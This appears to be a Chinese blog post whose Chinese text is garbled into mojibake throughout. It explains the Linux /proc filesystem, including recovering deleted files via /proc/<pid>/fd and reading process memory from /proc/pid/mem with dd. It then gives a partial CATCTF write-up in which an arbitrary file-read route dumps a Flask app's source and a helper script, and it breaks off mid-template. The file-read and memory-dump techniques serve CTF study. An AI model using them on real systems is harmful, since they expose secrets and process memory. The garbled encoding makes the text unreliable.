¸è®¾ç½®çš„æœºåˆ¶ã€‚procæ–‡ä»¶ç³»ç»Ÿæ˜¯ä¸€ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒåªå­˜åœ¨å†…å­˜å½“ä¸­ï¼Œè€Œä¸å ç”¨å¤–å­˜ç©ºé—´ã€‚å®ƒä»¥æ–‡ä»¶ç³»ç»Ÿçš„æ–¹å¼ä¸ºè®¿é—®ç³»ç»Ÿå†…æ ¸æ•°æ®çš„æ“ä½œæä¾›æ¥å£ã€‚ ç”¨æˆ·å’Œåº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡procå¾—åˆ°ç³»ç»Ÿçš„ä¿¡æ¯ï¼Œå¹¶å¯ä»¥æ”¹å˜å†…æ ¸çš„æŸäº›å‚æ•°ã€‚ç”±äºç³»ç»Ÿçš„ä¿¡æ¯ï¼Œå¦‚è¿›ç¨‹ï¼Œæ˜¯åŠ¨æ€æ”¹å˜çš„ï¼Œæ‰€ä»¥ç”¨æˆ·æˆ–åº”ç”¨ç¨‹åºè¯»å–procæ–‡ä»¶æ—¶ï¼Œprocæ–‡ä»¶ç³»ç»Ÿæ˜¯åŠ¨æ€ä»ç³»ç»Ÿå†…æ ¸è¯»å‡ºæ‰€éœ€ä¿¡æ¯å¹¶æäº¤çš„ã€‚ä¸‹é¢åˆ—å‡ºçš„è¿™äº›æ–‡ä»¶æˆ–å­æ–‡ä»¶å¤¹ï¼Œå¹¶ä¸æ˜¯éƒ½æ˜¯åœ¨ä½ çš„ç³»ç»Ÿä¸­å­˜åœ¨ï¼Œè¿™å–å†³äºä½ çš„å†…æ ¸é…ç½®å’Œè£…è½½çš„æ¨¡å—ã€‚å¦å¤–ï¼Œåœ¨/procä¸‹è¿˜æœ‰ä¸‰ä¸ªå¾ˆé‡è¦çš„ç›®å½•ï¼šnetï¼Œscsiå’Œsysã€‚ Sysç›®å½•æ˜¯å¯å†™çš„ï¼Œå¯ä»¥é€šè¿‡å®ƒæ¥è®¿é—®æˆ–ä¿®æ”¹å†…æ ¸çš„å‚æ•°ï¼Œè€Œnetå’Œscsiåˆ™ä¾èµ–äºå†…æ ¸é…ç½®ã€‚ä¾‹å¦‚ï¼Œå¦‚æœç³»ç»Ÿä¸æ”¯æŒscsiï¼Œåˆ™scsi ç›®å½•ä¸å­˜åœ¨ã€‚ é™¤äº†ä»¥ä¸Šä»‹ç»çš„è¿™äº›ï¼Œè¿˜æœ‰çš„æ˜¯ä¸€äº›ä»¥æ•°å­—å‘½åçš„ç›®å½•ï¼Œå®ƒä»¬æ˜¯è¿›ç¨‹ç›®å½•ã€‚ç³»ç»Ÿä¸­å½“å‰è¿è¡Œçš„æ¯ä¸€ä¸ªè¿›ç¨‹éƒ½æœ‰å¯¹åº”çš„ä¸€ä¸ªç›®å½•åœ¨/procä¸‹ï¼Œä»¥è¿›ç¨‹çš„ PIDå·ä¸ºç›®å½•åï¼Œå®ƒä»¬æ˜¯è¯»å–è¿›ç¨‹ä¿¡æ¯çš„æ¥å£ã€‚è€Œselfç›®å½•åˆ™æ˜¯è¯»å–è¿›ç¨‹æœ¬èº«çš„ä¿¡æ¯æ¥å£ï¼Œæ˜¯ä¸€ä¸ªlinkã€‚ ç›®å½• ä½œç”¨ /proc/buddyinfo æ¯ä¸ªå†…å­˜åŒºä¸­çš„æ¯ä¸ªorderæœ‰å¤šå°‘å—å¯ç”¨ï¼Œå’Œå†…å­˜ç¢ç‰‡é—®é¢˜æœ‰å…³ /proc/cmdline å¯åŠ¨æ—¶ä¼ é€’ç»™kernelçš„å‚æ•°ä¿¡æ¯ /proc/cpuinfo cpuçš„ä¿¡æ¯ /proc/crypto å†…æ ¸ä½¿ç”¨çš„æ‰€æœ‰å·²å®‰è£…çš„åŠ å¯†å¯†ç åŠç»†èŠ‚ /proc/devices å·²ç»åŠ è½½çš„è®¾å¤‡å¹¶åˆ†ç±» /proc/dma å·²æ³¨å†Œä½¿ç”¨çš„ISA DMAé¢‘é“åˆ—è¡¨ /proc/execdomains Linuxå†…æ ¸å½“å‰æ”¯æŒçš„execution domains /proc/fb å¸§ç¼“å†²è®¾å¤‡åˆ—è¡¨ï¼ŒåŒ…æ‹¬æ•°é‡å’Œæ§åˆ¶å®ƒçš„é©±åŠ¨ /proc/filesystems å†…æ ¸å½“å‰æ”¯æŒçš„æ–‡ä»¶ç³»ç»Ÿç±»å‹ /proc/interrupts x86æ¶æ„ä¸­çš„æ¯ä¸ªIRQä¸­æ–­æ•° /proc/iomem æ¯ä¸ªç‰©ç†è®¾å¤‡å½“å‰åœ¨ç³»ç»Ÿå†…å­˜ä¸­çš„æ˜ å°„ /proc/ioports ä¸€ä¸ªè®¾å¤‡çš„è¾“å…¥è¾“å‡ºæ‰€ä½¿ç”¨çš„æ³¨å†Œç«¯å£èŒƒå›´ /proc/kcore ä»£è¡¨ç³»ç»Ÿçš„ç‰©ç†å†…å­˜ï¼Œå­˜å‚¨ä¸ºæ ¸å¿ƒæ–‡ä»¶æ ¼å¼ï¼Œé‡Œè¾¹æ˜¾ç¤ºçš„æ˜¯å­—èŠ‚æ•°ï¼Œç­‰äºRAMå¤§å°åŠ ä¸Š4kb /proc/kmsg è®°å½•å†…æ ¸ç”Ÿæˆçš„ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡/sbin/klogdæˆ–/bin/dmesgæ¥å¤„ç† /proc/loadavg æ ¹æ®è¿‡å»ä¸€æ®µæ—¶é—´å†…CPUå’ŒIOçš„çŠ¶æ€å¾—å‡ºçš„è´Ÿè½½çŠ¶æ€ï¼Œä¸uptimeå‘½ä»¤æœ‰å…³ /proc/locks å†…æ ¸é”ä½çš„æ–‡ä»¶åˆ—è¡¨ /proc/mdstat å¤šç¡¬ç›˜ï¼ŒRAIDé…ç½®ä¿¡æ¯(md=multiple disks) /proc/meminfo RAMä½¿ç”¨çš„ç›¸å…³ä¿¡æ¯ /proc/misc å…¶ä»–çš„ä¸»è¦è®¾å¤‡(è®¾å¤‡å·ä¸º10)ä¸Šæ³¨å†Œçš„é©±åŠ¨ /proc/modules æ‰€æœ‰åŠ è½½åˆ°å†…æ ¸çš„æ¨¡å—åˆ—è¡¨ /proc/mounts ç³»ç»Ÿä¸­ä½¿ç”¨çš„æ‰€æœ‰æŒ‚è½½ /proc/mtrr ç³»ç»Ÿä½¿ç”¨çš„Memory Type Range Registers (MTRRs) /proc/partitions åˆ†åŒºä¸­çš„å—åˆ†é…ä¿¡æ¯ /proc/pci ç³»ç»Ÿä¸­çš„PCIè®¾å¤‡åˆ—è¡¨ /proc/slabinfo ç³»ç»Ÿä¸­æ‰€æœ‰æ´»åŠ¨çš„ slab ç¼“å­˜ä¿¡æ¯ /proc/stat æ‰€æœ‰çš„CPUæ´»åŠ¨ä¿¡æ¯ /proc/sysrq-trigger ä½¿ç”¨echoå‘½ä»¤æ¥å†™è¿™ä¸ªæ–‡ä»¶çš„æ—¶å€™ï¼Œè¿œç¨‹rootç”¨æˆ·å¯ä»¥æ‰§è¡Œå¤§å¤šæ•°çš„ç³»ç»Ÿè¯·æ±‚å…³é”®å‘½ä»¤ï¼Œå°±å¥½åƒåœ¨æœ¬åœ°ç»ˆç«¯æ‰§è¡Œä¸€æ ·ã€‚è¦å†™å…¥è¿™ä¸ªæ–‡ä»¶ï¼Œéœ€è¦æŠŠ/proc/sys/kernel/sysrqä¸èƒ½è®¾ç½®ä¸º0ã€‚è¿™ä¸ªæ–‡ä»¶å¯¹rootä¹Ÿæ˜¯ä¸å¯è¯»çš„ /proc/uptime ç³»ç»Ÿå·²ç»è¿è¡Œäº†å¤šä¹… /proc/swaps äº¤æ¢ç©ºé—´çš„ä½¿ç”¨æƒ…å†µ /proc/version Linuxå†…æ ¸ç‰ˆæœ¬å’Œgccç‰ˆæœ¬ /proc/bus ç³»ç»Ÿæ€»çº¿(Bus)ä¿¡æ¯ï¼Œä¾‹å¦‚pci/usbç­‰ /proc/driver é©±åŠ¨ä¿¡æ¯ /proc/fs æ–‡ä»¶ç³»ç»Ÿä¿¡æ¯ /proc/ide ideè®¾å¤‡ä¿¡æ¯ /proc/irq ä¸­æ–­è¯·æ±‚è®¾å¤‡ä¿¡æ¯ /proc/net ç½‘å¡è®¾å¤‡ä¿¡æ¯ /proc/scsi scsiè®¾å¤‡ä¿¡æ¯ /proc/tty ttyè®¾å¤‡ä¿¡æ¯ /proc/net/dev æ˜¾ç¤ºç½‘ç»œé€‚é…å™¨åŠç»Ÿè®¡ä¿¡æ¯ /proc/vmstat è™šæ‹Ÿå†…å­˜ç»Ÿè®¡ä¿¡æ¯ /proc/vmcore å†…æ ¸panicæ—¶çš„å†…å­˜æ˜ åƒ /proc/diskstats å–å¾—ç£ç›˜ä¿¡æ¯ /proc/schedstat kernelè°ƒåº¦å™¨çš„ç»Ÿè®¡ä¿¡æ¯ /proc/zoneinfo æ˜¾ç¤ºå†…å­˜ç©ºé—´çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œå¯¹åˆ†æè™šæ‹Ÿå†…å­˜è¡Œä¸ºå¾ˆæœ‰ç”¨ |ä»¥ä¸‹æ˜¯/procç›®å½•ä¸­è¿›ç¨‹Nçš„ä¿¡æ¯ ç›®å½• æè¿° /proc/N pidä¸ºNçš„è¿›ç¨‹ä¿¡æ¯ /proc/N/cmdline è¿›ç¨‹å¯åŠ¨å‘½ä»¤ /proc/N/cwd é“¾æ¥åˆ°è¿›ç¨‹å½“å‰å·¥ä½œç›®å½• /proc/N/environ è¿›ç¨‹ç¯å¢ƒå˜é‡åˆ—è¡¨ /proc/N/exe é“¾æ¥åˆ°è¿›ç¨‹çš„æ‰§è¡Œå‘½ä»¤æ–‡ä»¶ /proc/N/fd åŒ…å«è¿›ç¨‹ç›¸å…³çš„æ‰€æœ‰çš„æ–‡ä»¶æè¿°ç¬¦ /proc/N/maps ä¸è¿›ç¨‹ç›¸å…³çš„å†…å­˜æ˜ å°„ä¿¡æ¯ /proc/N/mem æŒ‡ä»£è¿›ç¨‹æŒæœ‰çš„å†…å­˜ï¼Œä¸å¯è¯» /proc/N/root é“¾æ¥åˆ°è¿›ç¨‹çš„æ ¹ç›®å½• /proc/N/stat è¿›ç¨‹çš„çŠ¶æ€ /proc/N/statm è¿›ç¨‹ä½¿ç”¨çš„å†…å­˜çš„çŠ¶æ€ /proc/N/status è¿›ç¨‹çŠ¶æ€ä¿¡æ¯ï¼Œæ¯”stat/statmæ›´å…·å¯è¯»æ€§ /proc/self é“¾æ¥åˆ°å½“å‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859-r--r--r-- 1 root root 0 Jan 5 14:48 buddyinfodr-xr-xr-x 4 root root 0 Jan 5 10:05 bus-r--r--r-- 1 root root 0 Jan 5 14:48 cgroups-r--r--r-- 1 root root 0 Jan 5 14:48 cmdline-r--r--r-- 1 root root 0 Jan 5 14:48 consoles-r--r--r-- 1 root root 0 Jan 5 14:48 cpuinfo-r--r--r-- 1 root root 0 Jan 5 14:48 crypto-r--r--r-- 1 root root 0 Jan 5 14:48 devices-r--r--r-- 1 root root 0 Jan 5 14:48 diskstats-r--r--r-- 1 root root 0 Jan 5 14:48 dmadr-xr-xr-x 2 root root 0 Jan 5 14:48 driver-r--r--r-- 1 root root 0 Jan 5 14:48 execdomains-r--r--r-- 1 root root 0 Jan 5 14:48 fb-r--r--r-- 1 root root 0 Jan 5 14:47 filesystemsdr-xr-xr-x 6 root root 0 Jan 5 10:05 fs-r--r--r-- 1 root root 0 Jan 5 14:48 interrupts-r--r--r-- 1 root root 0 Jan 5 14:48 iomem-r--r--r-- 1 root root 0 Jan 5 14:48 ioportsdr-xr-xr-x 25 root root 0 Jan 5 10:05 irq-r--r--r-- 1 root root 0 Jan 5 14:48 kallsymscrw-rw-rw- 1 root root 1, 3 Jan 5 10:05 kcore-r--r--r-- 1 root root 0 Jan 5 14:48 key-userscrw-rw-rw- 1 root root 1, 3 Jan 5 10:05 keys-r-------- 1 root root 0 Jan 5 14:48 kmsg-r-------- 1 root root 0 Jan 5 14:48 kpagecgroup-r-------- 1 root root 0 Jan 5 14:48 kpagecount-r-------- 1 root root 0 Jan 5 14:48 kpageflags-r--r--r-- 1 root root 0 Jan 5 14:48 loadavg-r--r--r-- 1 root root 0 Jan 5 14:48 locks-r--r--r-- 1 root root 0 Jan 5 14:48 mdstat-r--r--r-- 1 root root 0 Jan 5 14:48 meminfo-r--r--r-- 1 root root 0 Jan 5 14:48 misc-r--r--r-- 1 root root 0 Jan 5 14:48 moduleslrwxrwxrwx 1 root root 11 Jan 5 14:48 mounts -&gt; self/mounts-rw-r--r-- 1 root root 0 Jan 5 14:48 mtrrlrwxrwxrwx 1 root root 8 Jan 5 14:48 net -&gt; self/net-r-------- 1 root root 0 Jan 5 14:48 pagetypeinfo-r--r--r-- 1 root root 0 Jan 5 14:48 partitionsdr-xr-xr-x 2 root root 0 Jan 5 14:48 pressurecrw-rw-rw- 1 root root 1, 3 Jan 5 10:05 sched_debug-r--r--r-- 1 root root 0 Jan 5 14:48 schedstatdrwxrwxrwt 2 root root 40 Jan 5 10:05 scsilrwxrwxrwx 1 root root 0 Jan 5 10:05 self -&gt; 4932-r-------- 1 root root 0 Jan 5 14:48 slabinfo-r--r--r-- 1 root root 0 Jan 5 14:48 softirqs-r--r--r-- 1 root root 0 Jan 5 14:48 stat-r--r--r-- 1 root root 0 Jan 5 14:48 swapsdr-xr-xr-x 1 root root 0 Jan 5 10:05 sys--w------- 1 root root 0 Jan 5 10:05 sysrq-triggerdr-xr-xr-x 2 root root 0 Jan 5 14:48 sysvipclrwxrwxrwx 1 root root 0 Jan 5 10:05 thread-self -&gt; 4932/task/4932crw-rw-rw- 1 root root 1, 3 Jan 5 10:05 timer_listdr-xr-xr-x 4 root root 0 Jan 5 14:48 tty-r--r--r-- 1 root root 0 Jan 5 14:48 uptime-r--r--r-- 1 root root 0 Jan 5 14:48 version-r--r--r-- 1 root root 0 Jan 5 14:48 version_signature-r-------- 1 root root 0 Jan 5 14:48 vmallocinfo-r--r--r-- 1 root root 0 Jan 5 14:48 vmstat-r--r--r-- 1 root root 0 Jan 5 14:48 zoneinfo 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152-r--r--r-- 1 root root 0 Jan 5 14:48 arch_statusdr-xr-xr-x 2 root root 0 Jan 5 14:48 attr-rw-r--r-- 1 root root 0 Jan 5 14:48 autogroup-r-------- 1 root root 0 Jan 5 14:48 auxv-r--r--r-- 1 root root 0 Jan 5 14:48 cgroup--w------- 1 root root 0 Jan 5 14:48 clear_refs-r--r--r-- 1 root root 0 Jan 5 14:48 cmdline-rw-r--r-- 1 root root 0 Jan 5 14:48 comm-rw-r--r-- 1 root root 0 Jan 5 14:48 coredump_filter-r--r--r-- 1 root root 0 Jan 5 14:48 cpusetlrwxrwxrwx 1 root root 0 Jan 5 14:48 cwd -&gt; /-r-------- 1 root root 0 Jan 5 14:48 environlrwxrwxrwx 1 root root 0 Jan 5 14:48 exe -&gt; /usr/bin/python3.10dr-x------ 2 root root 0 Jan 5 14:48 fddr-x------ 2 root root 0 Jan 5 14:48 fdinfo-rw-r--r-- 1 root root 0 Jan 5 14:48 gid_map-r-------- 1 root root 0 Jan 5 14:48 io-r--r--r-- 1 root root 0 Jan 5 14:48 limits-rw-r--r-- 1 root root 0 Jan 5 14:48 loginuiddr-x------ 2 root root 0 Jan 5 14:48 map_files-r--r--r-- 1 root root 0 Jan 5 14:48 maps-rw------- 1 root root 0 Jan 5 14:48 mem-r--r--r-- 1 root root 0 Jan 5 14:48 mountinfo-r--r--r-- 1 root root 0 Jan 5 14:48 mounts-r-------- 1 root root 0 Jan 5 14:48 mountstatsdr-xr-xr-x 6 root root 0 Jan 5 14:48 netdr-x--x--x 2 root root 0 Jan 5 14:48 ns-r--r--r-- 1 root root 0 Jan 5 14:48 numa_maps-rw-r--r-- 1 root root 0 Jan 5 14:48 oom_adj-r--r--r-- 1 root root 0 Jan 5 14:48 oom_score-rw-r--r-- 1 root root 0 Jan 5 14:48 oom_score_adj-r-------- 1 root root 0 Jan 5 14:48 pagemap-r-------- 1 root root 0 Jan 5 14:48 patch_state-r-------- 1 root root 0 Jan 5 14:48 personality-rw-r--r-- 1 root root 0 Jan 5 14:48 projid_maplrwxrwxrwx 1 root root 0 Jan 5 14:47 root -&gt; /-rw-r--r-- 1 root root 0 Jan 5 14:48 sched-r--r--r-- 1 root root 0 Jan 5 14:48 schedstat-r--r--r-- 1 root root 0 Jan 5 14:48 sessionid-rw-r--r-- 1 root root 0 Jan 5 14:48 setgroups-r--r--r-- 1 root root 0 Jan 5 14:48 smaps-r--r--r-- 1 root root 0 Jan 5 14:48 smaps_rollup-r-------- 1 root root 0 Jan 5 14:48 stack-r--r--r-- 1 root root 0 Jan 5 14:48 stat-r--r--r-- 1 root root 0 Jan 5 14:48 statm-r--r--r-- 1 root root 0 Jan 5 14:48 status-r-------- 1 root root 0 Jan 5 14:48 syscalldr-xr-xr-x 3 root root 0 Jan 5 14:48 task-r--r--r-- 1 root root 0 Jan 5 14:48 timers-rw-rw-rw- 1 root root 0 Jan 5 14:48 timerslack_ns-rw-r--r-- 1 root root 0 Jan 5 14:48 uid_map-r--r--r-- 1 root root 0 Jan 5 14:48 wchan 0x02 å¦‚æœpython openäº†ä¸€ä¸ªæ–‡ä»¶ï¼Œ/proc å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿè¿è¡Œå¦‚ä¸‹ä»£ç : 12345678import osprint(os.getpid())flag = open('./flag','r')os.remove('./flag')b = input() #é˜»æ­¢Pythonè¿è¡Œç»“æŸ æ¥åˆ°pidç›®å½•ä¸‹çš„/fdç›®å½• 12345678root@VM-8-17-ubuntu:/proc/59428/fd# ls -latotal 0dr-x------ 2 root root 0 Jan 5 23:04 .dr-xr-xr-x 9 root root 0 Jan 5 23:03 ..lrwx------ 1 root root 64 Jan 5 23:06 0 -&gt; /dev/pts/0lrwx------ 1 root root 64 Jan 5 23:06 1 -&gt; /dev/pts/0lrwx------ 1 root root 64 Jan 5 23:06 2 -&gt; /dev/pts/0lr-x------ 1 root root 64 Jan 5 23:06 3 -&gt; /home/ubuntu/python/flag è¿™ä¸ªæ—¶å€™ï¼Œä½¿ç”¨rm -rf ./flagå‘½ä»¤åˆ é™¤ï¼Œå†å›åˆ°è¿™ä¸ªç›®å½• 12345678root@VM-8-17-ubuntu:/proc/59428/fd# ls -latotal 0dr-x------ 2 root root 0 Jan 5 23:04 .dr-xr-xr-x 9 root root 0 Jan 5 23:03 ..lrwx------ 1 root root 64 Jan 5 23:06 0 -&gt; /dev/pts/0lrwx------ 1 root root 64 Jan 5 23:06 1 -&gt; /dev/pts/0lrwx------ 1 root root 64 Jan 5 23:06 2 -&gt; /dev/pts/0lr-x------ 1 root root 64 Jan 5 23:06 3 -&gt; '/home/ubuntu/python/flag (deleted)' å¦‚æœå°è¯•cat /proc/{pid}/fd/3å°±å¯ä»¥å‘ç°ï¼Œè¢«åˆ é™¤çš„flagèƒ½è¢«catå‡ºæ¥ã€‚ 123456789101112root@VM-8-17-ubuntu:/proc/59428/fd# ls0 1 2 3root@VM-8-17-ubuntu:/proc/59428/fd# ls -latotal 0dr-x------ 2 root root 0 Jan 5 23:04 .dr-xr-xr-x 9 root root 0 Jan 5 23:03 ..lrwx------ 1 root root 64 Jan 5 23:06 0 -&gt; /dev/pts/0lrwx------ 1 root root 64 Jan 5 23:06 1 -&gt; /dev/pts/0lrwx------ 1 root root 64 Jan 5 23:06 2 -&gt; /dev/pts/0lr-x------ 1 root root 64 Jan 5 23:06 3 -&gt; '/home/ubuntu/python/flag (deleted)'root@VM-8-17-ubuntu:/proc/59428/fd# cat 3testtest 0x03 å†è¿›ä¸€æ­¥ï¼Ÿé¦–å…ˆï¼Œçœ‹ä¸€ä¸‹/proc/$pid/mapsæ˜¾ç¤º$ pidçš„å†…å­˜å†…å®¹ä»¥ä¸è¿‡ç¨‹ä¸­ç›¸åŒçš„æ–¹å¼æ˜ å°„ï¼Œå³ï¼Œä¼ªæ–‡ä»¶ä¸­åç§»é‡xå¤„çš„å­—èŠ‚ä¸è¿‡ç¨‹ä¸­åœ°å€xå¤„çš„å­—èŠ‚ç›¸åŒã€‚å¦‚æœåœ¨æ­¤è¿‡ç¨‹ä¸­æœªæ˜ å°„åœ°å€ï¼Œåˆ™ä»æ–‡ä»¶ä¸­çš„ç›¸åº”åç§»é‡è¯»å–å°†è¿”å›EIOï¼ˆè¾“å…¥/è¾“å‡ºé”™è¯¯ï¼‰ã€‚ä¾‹å¦‚ï¼Œç”±äºè¿›ç¨‹ä¸­çš„ç¬¬ä¸€é¡µä»æœªæ˜ å°„è¿‡ï¼ˆå› æ­¤ï¼Œå¯¹NULLæŒ‡é’ˆçš„å¼•ç”¨å®Œå…¨å¤±è´¥ï¼Œè€Œä¸æ˜¯æ„å¤–è®¿é—®å®é™…å†…å­˜ï¼‰ï¼Œå› æ­¤è¯»å–/proc/$pid/memçš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ€»æ˜¯ä¼šäº§ç”ŸI / Oé”™è¯¯ã€‚æ‰¾å‡º/proc/$pid/mapsæ˜ å°„å‡ºäº†è¿‡ç¨‹å­˜å‚¨å™¨çš„å“ªäº›éƒ¨åˆ†ã€‚è¯¥æ–‡ä»¶æ¯ä¸ªæ˜ å°„çš„åŒºåŸŸåŒ…å«ä¸€è¡Œï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 1208048000-08054000 r-xp 00000000 08:01 828061 /bin/cat08c9b000-08cbc000 rw-p 00000000 00:00 0 [heap] å‰ä¸¤ä¸ªæ•°å­—æ˜¯åŒºåŸŸçš„è¾¹ç•Œï¼ˆç¬¬ä¸€ä¸ªå­—èŠ‚çš„åœ°å€å’Œæœ€åä¸€ä¸ªå­—èŠ‚çš„åœ°å€ï¼Œä»¥å…­è¿›åˆ¶è¡¨ç¤ºï¼‰ã€‚ä¸‹ä¸€åˆ—åŒ…å«æƒé™ï¼Œå¦‚æœè¿™æ˜¯æ–‡ä»¶æ˜ å°„ï¼Œåˆ™åŒ…å«æœ‰å…³æ–‡ä»¶çš„ä¸€äº›ä¿¡æ¯ï¼ˆåç§»é‡ï¼Œè®¾å¤‡ï¼Œç´¢å¼•èŠ‚ç‚¹å’Œåç§°ï¼‰ã€‚ /proc/{pid}/memæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ï¼Œå¯ä»¥è®¿é—®è¿™ä¸ªè¿›ç¨‹çš„å†…å­˜ï¼Œä¸è¿‡åœ¨ä¸€èˆ¬çš„æƒ…å†µä¸‹ï¼Œè¿™ä¸œè¥¿æˆ‘ä»¬æ˜¯æ²¡æ³•ç›´æ¥æ‹–å‡ºæ¥çš„ï¼Œå†…å­˜æ˜¯ä¸€ç‰‡åºå¤§çš„æ²™æ¼ ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦åœ°å€ç»™äºˆæ–¹å‘ã€‚ 12è¦ä»/proc/$pid/memè¯»å–çš„è¿›ç¨‹å¿…é¡»ä½¿ç”¨å¸¦æœ‰r--------æ ‡å¿—çš„/proc/$pid/memé™„åŠ åˆ°è¯¥è¿›ç¨‹ã€‚è¿™æ˜¯è°ƒè¯•å™¨åœ¨å¼€å§‹è°ƒè¯•è¿›ç¨‹æ—¶æ‰€åšçš„å·¥ä½œã€‚è¿™ä¹Ÿæ˜¯ptraceå¯¹è¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨æ‰€åšçš„ã€‚è¯»å–å™¨å®Œæˆå¯¹PTRACE_ATTACHçš„è¯»å–åï¼Œåº”é€šè¿‡ä½¿ç”¨straceæ ‡å¿—è°ƒç”¨/proc/$pid/memæ¥æ–­å¼€è¿æ¥ã€‚è§‚å¯Ÿåˆ°çš„è¿›ç¨‹ä¸€å®šä¸èƒ½è¿è¡Œã€‚é€šå¸¸ï¼Œè°ƒç”¨ptraceå°†åœæ­¢ç›®æ ‡è¿›ç¨‹ï¼ˆå®ƒå‘é€PTRACE_DETACHä¿¡å·ï¼‰ï¼Œä½†æ˜¯å­˜åœ¨ç«äº‰çŠ¶æ€ï¼ˆä¿¡å·ä¼ é€’æ˜¯å¼‚æ­¥çš„ï¼‰ï¼Œå› æ­¤è·Ÿè¸ªç¨‹åºåº”è°ƒç”¨ptrace(PTRACE_ATTACH, â€¦)ï¼ˆå¦‚STOPä¸­æ‰€è¿°ï¼‰ã€‚ä»¥rootç”¨æˆ·èº«ä»½è¿è¡Œçš„è¿›ç¨‹å¯ä»¥è¯»å–ä»»ä½•è¿›ç¨‹çš„å†…å­˜ï¼Œè€Œæ— éœ€è°ƒç”¨waitï¼Œä½†æ˜¯å¿…é¡»åœæ­¢è§‚å¯Ÿåˆ°çš„è¿›ç¨‹ï¼Œå¦åˆ™è¯»å–ä»å°†è¿”å›ptrace(2)ã€‚ è¿™ä¸€å¨é¸Ÿè¯­åº”è¯¥éƒ½æ²¡çœ‹æ‡‚å§ï¼Œæ²¡é”™ï¼Œæˆ‘ä¹Ÿæ²¡çœ‹æ‡‚ï¼Œæ‰€ä»¥æˆ‘æ‹œè®¿äº†ä¸€ä¸‹chatGPT,ä¸å¾—ä¸è¯´ï¼ŒchatGPTçœŸçš„æ¯”googleå¥½ç”¨ You can read from and write to this file to access and modify the memory of the process. This can be useful for debugging and troubleshooting purposes. For example, you can use the dd command to read a block of memory from the /proc/pid/mem file, like this: 1dd if=/proc/pid/mem bs=1 count=1024 skip=0x1234000 This will read 1024 bytes of memory from the process starting at the address 0x1234000. Keep in mind that accessing the memory of a process can be dangerous, as it can potentially cause the process to crash or behave unexpectedly. It is generally best to use caution when using the /proc/pid/mem file. æˆ‘è‹±è¯­æ°´å¹³ä¸è¡Œï¼Œæˆ‘å°±ä¸ç¿»è¯‘äº†ï¼Œå¸ˆå‚…ä»¬åº”è¯¥èƒ½çœ‹æ‡‚ CATCTF CatCatinfoè·¯ç”±ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¯»åˆ°pythonæºä»£ç 123456789101112131415161718192021222324252627282930313233343536373839import os import uuid from flask import Flask, request, session, render_template, Markup from cat import cat flag = &quot;&quot; app = Flask( __name__, static_url_path='/', static_folder='static' ) app.config['SECRET_KEY'] = str(uuid.uuid4()).replace(&quot;-&quot;, &quot;&quot;) + &quot;*abcdefgh&quot; if os.path.isfile(&quot;/flag&quot;): flag = cat(&quot;/flag&quot;) os.remove(&quot;/flag&quot;) @app.route('/', methods=['GET']) def index(): detailtxt = os.listdir('./details/') cats_list = [] for i in detailtxt: cats_list.append(i[:i.index('.')]) return render_template(&quot;index.html&quot;, cats_list=cats_list, cat=cat) @app.route('/info', methods=[&quot;GET&quot;, 'POST']) def info(): filename = &quot;./details/&quot; + request.args.get('file', &quot;&quot;) start = request.args.get('start', &quot;0&quot;) end = request.args.get('end', &quot;0&quot;) name = request.args.get('file', &quot;&quot;)[:request.args.get('file', &quot;&quot;).index('.')] return render_template(&quot;detail.html&quot;, catname=name, info=cat(filename, start, end)) @app.route('/admin', methods=[&quot;GET&quot;]) def admin_can_list_root(): if session.get('admin') == 1: return flag else: session['admin'] = 0 return &quot;NoNoNo&quot; if __name__ == '__main__': app.run(host='0.0.0.0', debug=False, port=5637) å°è¯•proc/self/fdè¯»ç¯å¢ƒå˜é‡ä¸è¡Œï¼Œçœ‹æ ·å­ä¹Ÿä¸æ˜¯SSTIï¼Œæƒ³äº†æƒ³ï¼Œåº”è¯¥æ˜¯sessionä¸‹æ‰‹äº†ã€‚ é—®é¢˜æ¥äº†ï¼Œuuid4()æ— æ³•ç ´è§£ å³°å›è·¯è½¬ï¼Œçœ‹åˆ°catï¼Œå°è¯•è¯»å–ä¸€ä¸‹cat.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import os, sys, getopt def cat(filename, start=0, end=0)-&gt;bytes: data = b'' try: start = int(start) end = int(end) except: start=0 end=0 if filename != &quot;&quot; and os.access(filename, os.R_OK): f = open(filename, &quot;rb&quot;) if start &gt;= 0: f.seek(start) if end &gt;= start and end != 0: data = f.read(end-start) else: data = f.read() else: data = f.read() f.close() else: data = (&quot;File `%s` not exist or can not be read&quot; % filename).encode() return data if __name__ == '__main__': opts,args = getopt.getopt(sys.argv[1:],'-h-f:-s:-e:',['help','file=','start=','end=']) fileName = &quot;&quot; start = 0 end = 0 for opt_name, opt_value in opts: if opt_name == '-h' or opt_name == '--help': print(&quot;[*] Help&quot;) print(&quot;-f --file File name&quot;) print(&quot;-s --start Start position&quot;) print(&quot;-e --end End position&quot;) print(&quot;[*] Example of reading /etc/passwd&quot;) print(&quot;python3 cat.py -f /etc/passwd&quot;) print(&quot;python3 cat.py --file /etc/passwd&quot;) print(&quot;python3 cat.py -f /etc/passwd -s 1&quot;) print(&quot;python3 cat.py -f /etc/passwd -e 5&quot;) print(&quot;python3 cat.py -f /etc/passwd -s 1 -e 5&quot;) exit() elif opt_name == '-f' or opt_name == '--file': fileName = opt_value elif opt_name == '-s' or opt_name == '--start': start = opt_value elif opt_name == '-e' or opt_name == '--end': end = opt_value if fileName != &quot;&quot;: print(cat(fileName, start, end)) else: print(&quot;No file to read&quot;) ç»ˆäºéœ²å‡ºåªå› è„šäº†ã€‚ æŠŠæ¨¡æ¿æ‹–å‡ºæ¥çœ‹ä¸€çœ‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596&lt;!DOCTYPE HTML&gt;&lt;html class=&quot;no-js&quot;&gt;&lt;head&gt;&lt;!-- Basic Page Needs 